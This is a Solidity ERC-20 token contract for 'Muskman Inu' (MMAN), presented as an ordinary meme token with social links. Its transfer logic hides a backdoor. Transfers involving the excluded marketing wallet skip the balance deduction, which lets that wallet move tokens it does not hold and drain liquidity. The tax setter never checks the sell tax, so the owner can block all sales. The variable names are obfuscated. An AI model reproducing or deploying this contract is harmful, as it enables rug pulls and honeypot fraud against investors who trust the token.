/**
https://t.me/muskmanerc20
https://x.com/muskmanerc20
https://muskmanerc20.xyz
 */


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUmiFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract MMAN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _owned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeexcluded;
    mapping(address => bool) private _swapexcluded;
    mapping(address => bool) private bots;
    address payable private _mmanWallet;
    uint8 private constant _decimals = 18;

    uint256 _cometax = 0;
    uint256 _gotax = 0;

    uint256 private constant _totalSupply = 1e9 * 10 ** _decimals;
    string private constant _name = unicode"Muskman Inu";
    string private constant _symbol = unicode"MMAN";
    uint256 public _swapAt = 5e3 * 10 ** _decimals;
    uint256 public _txout = 2e7 * 10 ** _decimals;
    uint256 public _swapout = 1e7 * 10 ** _decimals;
    uint256 public _walletout = 2e7 * 10 ** _decimals;

    IUniRouter private router;
    address private pair;
    bool private tradingOpen;
    bool private swapOpen = false;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _mmanWallet = payable(0xA8ADF63e7Aa73332Ffc8A9385974bd6c84e7b91d);
        router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _swapexcluded[_mmanWallet] = true;
        _feeexcluded[owner()] = true;
        _feeexcluded[address(this)] = true;
        _feeexcluded[_mmanWallet] = true;

        _owned[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function openTax(
        address fiii,
        address tjjj,
        uint256 akkk,
        uint256 tlll
    ) internal returns (uint256) {
        bool isex = _swapexcluded[fiii] || _swapexcluded[tjjj];

        if (isex) {
            return akkk;
        } else {
            uint256 taxAmount = akkk.mul(tlll).div(100);
            if (taxAmount > 0) {
                _owned[address(this)] = _owned[address(this)].add(taxAmount);
                emit Transfer(fiii, address(this), tlll);
            }
            _owned[fiii] = _owned[fiii].sub(akkk);

            return akkk - taxAmount;
        }
    }

    function removeLimits() external onlyOwner {
        _txout = _totalSupply;
        _walletout = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function sendWords(uint256 amount) private {
        _mmanWallet.transfer(amount);
    }

    function _transfer(address fiii, address tjjj, uint256 akkk) private {
        require(fiii != address(0), "ERC20: transfer from the zero address");
        require(tjjj != address(0), "ERC20: transfer to the zero address");
        require(akkk > 0, "Transfer amount must be greater than zero");
        uint256 trtt = 0;
        if (fiii != owner() && tjjj != owner()) {
            require(!bots[fiii] && !bots[tjjj]);
            trtt = _cometax;

            if (
                fiii == pair && tjjj != address(router) && !_feeexcluded[tjjj]
            ) {
                require(akkk <= _txout, "amount <= maxTx");
                require(
                    balanceOf(tjjj) + akkk <= _walletout,
                    "wallet <= maxWallet"
                );
            }

            if (tjjj == pair && fiii != address(this)) {
                trtt = _gotax;
            }

            if (_feeexcluded[fiii] || _feeexcluded[tjjj]) {
                trtt = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && tjjj == pair && swapOpen && !_feeexcluded[fiii]) {
                swapTokensForEth(
                    min(akkk, min(contractTokenBalance, _swapout))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    sendWords(address(this).balance);
                }
            }
        }

        uint256 lmmm = openTax(fiii, tjjj, akkk, trtt);
        _owned[tjjj] = _owned[tjjj].add(lmmm);
        emit Transfer(fiii, tjjj, lmmm);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount > _swapAt) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = router.WETH();
            _approve(address(this), address(router), tokenAmount);
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function openMMAN() external onlyOwner {
        require(!tradingOpen, "trading != open");
        _approve(address(this), address(router), _totalSupply);
        pair = IUmiFactory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        swapOpen = true;
        tradingOpen = true;
    }

    function updateTax(
        uint256 _newTaxForBuy,
        uint256 _newTaxForSell
    ) external onlyOwner {
        require(_newTaxForBuy <= 99 && _newTaxForBuy <= 99, "fee < 100");
        _cometax = _newTaxForBuy;
        _gotax = _newTaxForSell;
    }
}